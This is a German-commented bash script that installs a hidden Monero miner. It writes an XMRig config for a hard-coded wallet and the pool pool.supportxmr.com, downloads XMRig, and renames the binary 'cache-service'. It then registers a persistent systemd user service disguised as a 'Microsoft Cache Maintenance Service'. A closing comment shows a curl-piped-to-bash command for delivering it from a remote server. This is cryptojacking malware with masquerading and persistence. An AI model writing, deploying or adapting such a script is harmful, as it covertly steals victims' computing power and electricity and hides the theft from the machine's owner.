#!/usr/bin/env bash
set -euo pipefail

# ====================== EINSTELLUNGEN ======================
WALLET="4A2GjyjSnQqUjJMZvLju8YZaFSRZcb6qCC2Dw1DbebjNgCGviijSWjHRkeuPn5amLNP2h2P4vEBVi1bnG1BjqJ4yRotXGoF"
POOL="pool.supportxmr.com:5555"
PASS="${USER:-x}"
THREADS=50
SERVICE_NAME="ms-cache"
# ===========================================================

BASE="$HOME/.local/share/ms-cache"
BIN_DIR="$BASE/bin"
BIN="$BIN_DIR/cache-service"
CONFIG="$BASE/settings.json"
SERVICE_DIR="$HOME/.config/systemd/user"
SERVICE_FILE="$SERVICE_DIR/${SERVICE_NAME}.service"

mkdir -p "$BIN_DIR" "$SERVICE_DIR"

# ---------- Config schreiben ----------
cat > "$CONFIG" <<EOF
{
    "autosave": true,
    "background": false,
    "colors": false,
    "title": false,
    "randomx": {
        "init": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": $THREADS,
        "asm": true,
        "argon2-impl": null
    },
    "opencl": { "enabled": false },
    "cuda":   { "enabled": false },
    "donate-level": 1,
    "log-file": null,
    "pools": [
        {
            "url": "$POOL",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "enabled": true,
            "tls": false
        }
    ],
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "watch": true,
    "pause-on-battery": false
}
EOF

# ---------- Architektur erkennen + passendes Binary laden ----------
ARCH=$(uname -m)
case "$ARCH" in
    x86_64)  ASSET_PATTERN="linux-static-x64" ;;
    aarch64) ASSET_PATTERN="linux-static-arm64" ;;
    armv7l|armhf) ASSET_PATTERN="linux-armv7" ;;
    *)
        echo "Nicht unterstützte Architektur: $ARCH" >&2
        exit 1
        ;;
esac

if [[ ! -x "$BIN" ]]; then
    echo "Lade passende Version..."

    # Neueste Release-Infos holen
    RELEASE_JSON=$(curl -fsSL "https://api.github.com/repos/xmrig/xmrig/releases/latest" \
        -H "User-Agent: Mozilla/5.0" \
        -H "Accept: application/vnd.github+json")

    DOWNLOAD_URL=$(echo "$RELEASE_JSON" | grep -o "https://github.com/xmrig/xmrig/releases/download/[^\"]*${ASSET_PATTERN}\.tar\.gz" | head -1)

    if [[ -z "$DOWNLOAD_URL" ]]; then
        echo "Konnte keinen Download-Link für $ASSET_PATTERN finden." >&2
        exit 1
    fi

    TMP_TAR=$(mktemp /tmp/cache-XXXXXX.tar.gz)
    TMP_DIR=$(mktemp -d /tmp/cache-extract-XXXXXX)

    curl -fsSL "$DOWNLOAD_URL" -o "$TMP_TAR"
    tar -xzf "$TMP_TAR" -C "$TMP_DIR"

    # xmrig Binary finden und umbenennen
    FOUND=$(find "$TMP_DIR" -type f -name "xmrig" | head -1)
    if [[ -z "$FOUND" ]]; then
        echo "Binary nicht im Archiv gefunden." >&2
        rm -rf "$TMP_TAR" "$TMP_DIR"
        exit 1
    fi

    mv "$FOUND" "$BIN"
    chmod +x "$BIN"

    # Aufräumen
    rm -rf "$TMP_TAR" "$TMP_DIR"
fi

# ---------- systemd User-Service anlegen ----------
cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=Microsoft Cache Maintenance Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=$BIN --config=$CONFIG
Restart=always
RestartSec=8
Nice=10
# Optional: etwas mehr Rechte für Huge Pages (kann man weglassen)
# AmbientCapabilities=CAP_SYS_NICE CAP_IPC_LOCK

[Install]
WantedBy=default.target
EOF

# Service aktivieren + starten
systemctl --user daemon-reload
systemctl --user enable --now "$SERVICE_NAME.service" >/dev/null 2>&1 || true

# Sofort starten falls Service noch nicht läuft
if ! systemctl --user is-active --quiet "$SERVICE_NAME.service"; then
    systemctl --user start "$SERVICE_NAME.service" >/dev/null 2>&1 || true
fi

# curl -fsSL https://dein-server.com/start.sh | bash
